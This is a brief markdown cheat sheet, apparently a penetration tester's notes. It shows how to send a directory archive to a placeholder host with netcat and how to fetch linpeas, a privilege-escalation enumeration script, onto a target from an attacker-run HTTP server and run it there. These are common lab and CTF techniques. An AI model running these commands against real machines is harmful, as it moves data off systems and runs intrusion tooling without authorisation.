## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc x.x.x.x 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Download and serve linpeas
### Sender:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Receiver
```bash
cd /tmp
wget x.x.x.x:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
```
